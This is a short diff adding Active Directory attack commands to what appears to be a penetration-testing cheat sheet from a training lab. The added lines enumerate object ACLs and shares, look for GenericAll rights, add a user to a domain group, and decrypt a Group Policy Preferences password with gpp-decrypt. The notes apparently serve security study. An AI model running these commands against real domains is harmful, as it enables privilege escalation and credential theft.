@@ -230,4 +230,10 @@ Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurit
 Find-LocalAdminAccess
 setspn -L iis_service
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-ObjectAcl -Identity <username>
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104										\\\\ This translates the sid into a readable name (ACL Permissions)
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+net group "Management Department" stephanie /add /domain
+Find-DomainShare
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"													\\\\ The argument is a hash retrieved during the Information Gathering
 ```
